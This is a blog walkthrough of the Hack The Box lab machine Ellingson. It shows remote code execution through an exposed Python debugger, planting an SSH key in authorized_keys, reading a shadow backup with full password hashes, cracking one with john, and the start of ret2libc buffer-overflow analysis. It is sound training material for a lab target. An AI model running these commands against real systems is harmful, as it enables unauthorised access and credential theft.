<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Hack The Box - Ellingson | 0xRick</title>
<meta name="generator" content="Jekyll v3.8.5" />
<meta property="og:title" content="Hack The Box - Ellingson" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="My write-up / walkthrough for Ellingson from Hack The Box." />
<meta property="og:description" content="My write-up / walkthrough for Ellingson from Hack The Box." />
<link rel="canonical" href="https://0xrick.github.io/hack-the-box/ellingson/" />
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/ellingson/" />
<meta property="og:site_name" content="0xRick" />
<meta property="og:image" content="https://0xrick.github.io/hackthebox/ellingson/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-10-19T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"My write-up / walkthrough for Ellingson from Hack The Box.","@type":"BlogPosting","url":"https://0xrick.github.io/hack-the-box/ellingson/","image":"https://0xrick.github.io/hackthebox/ellingson/0.png","headline":"Hack The Box - Ellingson","dateModified":"2019-10-19T00:00:00+02:00","datePublished":"2019-10-19T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xrick.github.io/hack-the-box/ellingson/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://0xrick.github.io/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
</head><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-facebook"></i></a><a class="color-purple-hover" href="https://github.com/0xRick" target="_blank" rel="noopener noreferrer"><i class="fab fa-github"></i></a><a class="color-orange-hover" href="https://www.reddit.com/user/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer"><i class="fab fa-reddit"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/332196573771595777" target="_blank" rel="noopener noreferrer"><i class="fab fa-discord"></i></a>
        <a class="color-red-hover" href="mailto:x0rick@protonmail.com"><i class="fa fa-envelope"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="author-box">
<img src="/avatar.jpg" width="256px" height="256px" class="author-avatar" onclick="window.open('https://www.hackthebox.eu/profile/65598','_blank');">
<h7>
	Ahmed Hesham<br>
	CyberSec/InfoSec enthusiast. <br>
	Interested in knowing how things work/Interested in breaking them, always learning.
</h7>
</div>

  <br>
<div>
	<h7>    Ad </h7>
	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script>
</div>
<div class="post">
  <h1 class="post-title">Hack The Box - Ellingson</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/linux/">linux</a>
      
      <a class="tag" href="/tag/web/">web</a>
      
      <a class="tag" href="/tag/rce/">rce</a>
      
      <a class="tag" href="/tag/ssh/">ssh</a>
      
      <a class="tag" href="/tag/python/">python</a>
      
      <a class="tag" href="/tag/binary-exploitation/">binary-exploitation</a>
      
      <a class="tag" href="/tag/buffer-overflow/">buffer-overflow</a>
      
      <a class="tag" href="/tag/exploit-development/">exploit-development</a>
      
  </div>
  
  <div class="post-date">Published on 19 Oct 2019</div>
  
  <div class="post-description">My write-up / walkthrough for Ellingson from Hack The Box.</div>
  
  <hr>

<h2 id="quick-summary">Quick Summary</h2>
<p><br>Hey guys, today Ellingson retired and here’s my write-up about it. It was a fun box with a very nice binary exploitation privesc, I found the way of getting RCE on this box (which was by abusing the debugger of a python server that was running on the box) very interesting. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.139</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">ellingson.htb</code>. Let’s jump right in !<br>
<img src="/images/hackthebox/ellingson/0.png" alt="">
<br><br></p>
<hr>

<h2 id="nmap">Nmap</h2>
<p><br>As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ellingson# nmap -sV -sT -sC -o nmapinitial ellingson.htb 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-18 14:11 EET
Nmap scan report for ellingson.htb (10.10.10.139)
Host is up (0.13s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://ellingson.htb/index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.79 seconds
</code></pre></div></div>
<p><br>We got <code class="highlighter-rouge">http</code> on port 80 and <code class="highlighter-rouge">ssh</code> on port 22.
<br></p>
<hr>

<h2 id="web-enumeration">Web Enumeration</h2>
<p><br>Let’s take a look at the index page:
<br><code class="highlighter-rouge">http://ellingson.htb</code>:<br>
<img src="/images/hackthebox/ellingson/1.png" alt="">
<br>
<br>
<img src="/images/hackthebox/ellingson/2.png" alt="">
<br>
<br>
<img src="/images/hackthebox/ellingson/3.png" alt="">
<br><br>The only interesting thing was these articles at the top of the page:<br>
<img src="/images/hackthebox/ellingson/1.png" alt="">
<br><br>The first one was talking about a virus that was planted in their mainframe:<br>
<img src="/images/hackthebox/ellingson/4.png" alt="">
<br><br>The second one was talking about a brute-force protection that was recently added which tells us not to attempt to bruteforce anything or we’ll get banned:<br>
<img src="/images/hackthebox/ellingson/5.png" alt="">
<br><br>The third one was advising users to change their passwords because of some suspicious network activity that was detected, telling them that the most common passwords are Love, Secret, Sex and God:<br>
<img src="/images/hackthebox/ellingson/6.png" alt="">
<br><br>So far the only interesting thing we have is the 4 common passwords.
<br>The articles path followed this pattern: <code class="highlighter-rouge">/articles/n</code> (<code class="highlighter-rouge">n</code> is the article number) so I thought of trying different numbers to see if there’s a hidden article or something like that. When I tried <code class="highlighter-rouge">4</code> I got an error because that article doesn’t exist, I expected a <code class="highlighter-rouge">404</code> error but I got this debugger:<br>
<img src="/images/hackthebox/ellingson/7.png" alt="">
<br><br>By hovering over one of the lines a small console icon appears, its description says that it open an interactive python shell:<br>
<img src="/images/hackthebox/ellingson/8.png" alt="">
<br><br>
<img src="/images/hackthebox/ellingson/9.png" alt="">
<br><br>
<img src="/images/hackthebox/ellingson/10.png" alt="">
<br></p>
<hr>

<h2 id="rce--ssh-as-hal">RCE –&gt; SSH as hal</h2>
<p><br>With <code class="highlighter-rouge">popen()</code> from <code class="highlighter-rouge">os</code> we can execute commands and read the output like this:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s">'whoami'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
<span class="n">hal</span>
</code></pre></div></div>
<p><br>We are executing commands as <code class="highlighter-rouge">hal</code> who doesn’t have the user flag:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s">'pwd'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
<span class="o">/</span>

<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s">'ls -la /home'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
<span class="n">total</span> <span class="mi">24</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">6</span> <span class="n">root</span>      <span class="n">root</span>      <span class="mi">4096</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">23</span> <span class="n">root</span>      <span class="n">root</span>      <span class="mi">4096</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">..</span>
<span class="n">drwxrwx</span><span class="o">---</span>  <span class="mi">3</span> <span class="n">duke</span>      <span class="n">duke</span>      <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">10</span>  <span class="mi">2019</span> <span class="n">duke</span>
<span class="n">drwxrwx</span><span class="o">---</span>  <span class="mi">5</span> <span class="n">hal</span>       <span class="n">hal</span>       <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">7</span> <span class="mi">13</span><span class="p">:</span><span class="mi">12</span> <span class="n">hal</span>
<span class="n">drwxrwx</span><span class="o">---</span>  <span class="mi">6</span> <span class="n">margo</span>     <span class="n">margo</span>     <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">18</span> <span class="mi">11</span><span class="p">:</span><span class="mo">01</span> <span class="n">margo</span>
<span class="n">drwxrwx</span><span class="o">---</span>  <span class="mi">4</span> <span class="n">theplague</span> <span class="n">theplague</span> <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">7</span> <span class="mi">13</span><span class="p">:</span><span class="mi">13</span> <span class="n">theplague</span>

<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s">'ls -la /home/hal'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
<span class="n">total</span> <span class="mi">36</span>
<span class="n">drwxrwx</span><span class="o">---</span> <span class="mi">5</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">7</span> <span class="mi">13</span><span class="p">:</span><span class="mi">12</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">6</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">hal</span>  <span class="n">hal</span>   <span class="mi">220</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">bash_logout</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mi">3771</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">bashrc</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">10</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">cache</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">10</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">gnupg</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">hal</span>  <span class="n">hal</span>   <span class="mi">807</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">profile</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">18</span> <span class="mi">08</span><span class="p">:</span><span class="mi">28</span> <span class="o">.</span><span class="n">ssh</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span> <span class="mi">1</span> <span class="n">hal</span>  <span class="n">hal</span>   <span class="mi">865</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">viminfo</span>
</code></pre></div></div>
<p><br>So we will need to be another user, however we need to get a shell first. We can simply <code class="highlighter-rouge">echo</code> our public key to <code class="highlighter-rouge">/home/hal/.ssh/auhtorized_keys</code> and get <code class="highlighter-rouge">ssh</code> as hal:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s">'echo </span><span class="se">\"</span><span class="s">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGEUzu7cGthWtPNXM5/rAvPBywgyh68AEpSyUBXm24kByXu+GhEmvAiVlkAhasBgTjiCbpup3dmzz54ADlo4T2jUWoVVEDOw82eKQ6EoqpYnHGVmpDmJ1n7+eCvb3ut0bl5VOnTkhYSWS8G9V6V+E/VmDun63HoHCHzvtBlbN/ZmhRKxdwNFSYN/NswU8MFK+MVXxa/FJUxrOJVAnefXQdfDBxIt4j/qqMr68u9lQfqOX5shmS0M55lFNAY2mR6INBQtT6AnAWremPCHdUHxU3eSvzUcItaamecSPTfDgMQDQkxXrrsKQLkJeCKZ/1EwDBXIF3RGCeNGq0hCYHSF8d root@kali</span><span class="se">\"</span><span class="s"> &gt; /home/hal/.ssh/authorized_keys'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>

</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ellingson# ssh -i ./id_rsa hal@ellingson.htb 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 18 12:30:03 UTC 2019

  System load:  0.0                Processes:            105
  Usage of /:   23.8% of 19.56GB   Users logged in:      1
  Memory usage: 18%                IP address for ens33: 10.10.10.139
  Swap usage:   0%

  =&gt; There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

163 packages can be updated.
80 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Oct 18 09:08:47 2019 from 10.10.15.92
hal@ellingson:~$ whoami
hal
hal@ellingson:~$ 
</code></pre></div></div>
<p><br></p>
<hr>

<h2 id="shadowbak--ssh-as-margo">shadow.bak –&gt; SSH as margo</h2>
<p><br>There are 4 users on the box: <code class="highlighter-rouge">duke</code>, <code class="highlighter-rouge">hal</code>, <code class="highlighter-rouge">margo</code> and <code class="highlighter-rouge">theplague</code>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hal@ellingson:/home$ ls -al
total 24
drwxr-xr-x  6 root      root      4096 Mar  9  2019 .
drwxr-xr-x 23 root      root      4096 Mar  9  2019 ..
drwxrwx---  3 duke      duke      4096 Mar 10  2019 duke
drwxrwx---  5 hal       hal       4096 May  7 13:12 hal
drwxrwx---  6 margo     margo     4096 Oct 18 11:01 margo
drwxrwx---  4 theplague theplague 4096 May  7 13:13 theplague
hal@ellingson:/home$ 
</code></pre></div></div>
<p><br>One of the places I always like to check when trying to escalate privileges is <code class="highlighter-rouge">/var/backups</code>. On this box there was a backup for <code class="highlighter-rouge">/etc/shadow</code> there:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hal@ellingson:/var/backups$ ls -la
total 708
drwxr-xr-x  2 root root     4096 May  7 13:14 .
drwxr-xr-x 14 root root     4096 Mar  9  2019 ..
-rw-r--r--  1 root root    61440 Mar 10  2019 alternatives.tar.0
-rw-r--r--  1 root root     8255 Mar  9  2019 apt.extended_states.0
-rw-r--r--  1 root root      437 Jul 25  2018 dpkg.diversions.0
-rw-r--r--  1 root root      295 Mar  9  2019 dpkg.statoverride.0
-rw-r--r--  1 root root   615441 Mar  9  2019 dpkg.status.0
-rw-------  1 root root      811 Mar  9  2019 group.bak
-rw-------  1 root shadow    678 Mar  9  2019 gshadow.bak
-rw-------  1 root root     1757 Mar  9  2019 passwd.bak
-rw-r-----  1 root adm      1309 Mar  9  2019 shadow.bak
hal@ellingson:/var/backups$ cat shadow.bak
root:*:17737:0:99999:7:::
daemon:*:17737:0:99999:7:::
bin:*:17737:0:99999:7:::
sys:*:17737:0:99999:7:::
sync:*:17737:0:99999:7:::
games:*:17737:0:99999:7:::
man:*:17737:0:99999:7:::
lp:*:17737:0:99999:7:::
mail:*:17737:0:99999:7:::
news:*:17737:0:99999:7:::
uucp:*:17737:0:99999:7:::
proxy:*:17737:0:99999:7:::
www-data:*:17737:0:99999:7:::
backup:*:17737:0:99999:7:::
list:*:17737:0:99999:7:::
irc:*:17737:0:99999:7:::
gnats:*:17737:0:99999:7:::
nobody:*:17737:0:99999:7:::
systemd-network:*:17737:0:99999:7:::
systemd-resolve:*:17737:0:99999:7:::
syslog:*:17737:0:99999:7:::
messagebus:*:17737:0:99999:7:::
_apt:*:17737:0:99999:7:::
lxd:*:17737:0:99999:7:::
uuidd:*:17737:0:99999:7:::
dnsmasq:*:17737:0:99999:7:::
landscape:*:17737:0:99999:7:::
pollinate:*:17737:0:99999:7:::
sshd:*:17737:0:99999:7:::
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
hal@ellingson:/var/backups$ 
</code></pre></div></div>
<p><br>First time I solved the box I created a list with all password combinations from rockyou that had the words “love, secret, sex and god” (most common passwords we saw earlier) and tried to crack the 3 hashes with it. I could get <code class="highlighter-rouge">margo</code>’s password which had “god” in it.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ellingson# echo 'margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::' &gt; margo.hash
root@kali:~/Desktop/HTB/boxes/ellingson# grep -i god /usr/share/wordlists/rockyou.txt &gt; list.txt
root@kali:~/Desktop/HTB/boxes/ellingson# john --wordlist=./list.txt margo.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
iamgod$08        (margo)
1g 0:00:00:08 DONE (2019-10-18 14:58) 0.1234g/s 829.6p/s 829.6c/s 829.6C/s iamgod22..hydrogod20
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>
<p><br>Now we can simply <code class="highlighter-rouge">ssh</code> into the box as <code class="highlighter-rouge">margo : iamgod$08</code>:<br>
<img src="/images/hackthebox/ellingson/11.png" alt="">
<br>
<br>We owned user.
<br></p>
<hr>

<h2 id="binary-analysis">Binary: Analysis</h2>
<p><br>I searched for <code class="highlighter-rouge">suid</code> binaries and found a strange binary called <code class="highlighter-rouge">garbage</code>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>margo@ellingson:~$ find / -perm -4000 2&gt;/dev/null            
/usr/bin/at        
/usr/bin/newgrp        
/usr/bin/pkexec        
/usr/bin/passwd       
/usr/bin/gpasswd        
/usr/bin/garbage      
/usr/bin/newuidmap           
/usr/bin/sudo
/usr/bin/traceroute6.iputils           
/usr/bin/chfn     
/usr/bin/newgidmap           
/usr/bin/chsh
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/umount
/bin/ntfs-3g
/bin/ping
/bin/mount
/bin/fusermount
---
</code></pre></div></div>
<p><br>When executed it asks for a password, providing a long password crashes it:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>margo@ellingson:~$ /usr/bin/garbage
Enter access password: test

access denied.
margo@ellingson:~$ /usr/bin/garbage 
Enter access password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

access denied.
Segmentation fault (core dumped)
margo@ellingson:~$ 
</code></pre></div></div>
<p><br>So we have a buffer overflow, I downloaded the binary on my machine:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ellingson# scp margo@ellingson.htb:/usr/bin/garbage ./                                                                                                                              
margo@ellingson.htb's password:
garbage                                                                                                                                                                          100%   18KB  60.4KB/s   00:00    
root@kali:~/Desktop/HTB/boxes/ellingson#
</code></pre></div></div>
<p><br><code class="highlighter-rouge">checksec</code> shows that <code class="highlighter-rouge">NX</code> (non-executable stack) is enabled so we will do a <code class="highlighter-rouge">ret2libc</code> attack:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="err">#</span> <span class="n">file</span> <span class="n">garbage</span>
<span class="n">garbage</span><span class="o">:</span> <span class="n">setuid</span> <span class="n">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">executable</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span><span class="p">,</span> <span class="n">interpreter</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span><span class="p">,</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mi">3</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">,</span> <span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="n">de1fde9d14eea8a6dfd050fffe52bba92a339959</span><span class="p">,</span> <span class="n">not</span>
<span class="n">stripped</span>
<span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="err">#</span> <span class="n">checksec</span> <span class="p">.</span><span class="o">/</span><span class="n">garbage</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">No</span> <span class="n">PIE</span> 
</code></pre></div></div>
<p><br><code class="highlighter-rouge">ASLR</code> is enabled so will need to get around that:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space
2
</code></pre></div></div>
<p><br>I downloaded <code class="highlighter-rouge">libc</code> from the box:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>margo@ellingson:~$ ldd /usr/bin/garbage
        linux-vdso.so.1 (0x00007ffd0a7f0000)
        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f55ded1e000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f55df10f000)
margo@ellingson:~$
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ellingson# scp margo@ellingson.htb:/lib/x86_64-linux-gnu/libc.so.6 ./
margo@ellingson.htb's password:
libc.so.6                                                                                                                                                                        100% 1983KB 263.6KB/s   00:07    
root@kali:~/Desktop/HTB/boxes/ellingson#
</code></pre></div></div>
<p><br></p>
<hr>

<h2 id="binary-exploitation">Binary: Exploitation</h2>
<p><br>To defeat <code class="highlighter-rouge">ASLR</code> our first <code class="highlighter-rouge">rop</code> chain will leak <code class="highlighter-rouge">__libc_start_main</code> by calling <code class="highlighter-rouge">puts()</code> with <code class="highlighter-rouge">__libc_start_main@plt</code> address as an argument. Then by subtracting <code class="highlighter-rouge">__libc_start_main@@GLIBC</code> address from the leaked address we will get the base address of <code class="highlighter-rouge">libc</code>.
<br>After leaking <code class="highlighter-rouge">libc</code>’s address we can easily calculate the addresses we need and do our second chain which will perform the <code class="highlighter-rouge">ret2libc</code> attack.
<br>First we need to find the offset, I used a pattern to do it (I’m using <a href="https://github.com/hugsy/gef" target="_blank" rel="noopener noreferrer">gef</a>):</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">pattern</span> <span class="n">create</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">a</span> <span class="n">pattern</span> <span class="n">of</span> <span class="mi">1024</span> <span class="n">bytes</span>

<span class="n">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaa</span>
<span class="n">aaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaa</span>
